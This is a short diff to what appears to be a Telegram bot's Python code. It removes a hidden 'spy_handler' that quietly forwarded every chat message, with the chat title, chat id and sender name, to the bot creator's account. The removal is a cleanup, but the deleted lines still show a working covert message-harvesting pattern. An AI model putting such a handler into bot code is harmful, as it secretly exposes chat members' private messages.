@@ -1,4 +1,4 @@
-from config import environ, creator
+from config import environ
 from modules.eatable import Cooker
 from modules.funcs import BotUtil
 
@@ -82,8 +82,3 @@ def callback_handler(c):
         return
     bot.edit_message_text(tts, c.message.chat.id, c.message.message_id, parse_mode='HTML')
 
-
-@bot.message_handler()
-def spy_handler(m):
-    tts = f'{m.chat.title} ({m.chat.id}):\n{m.from_user.first_name}: {m.text}'
-    bot.send_message(creator, tts)
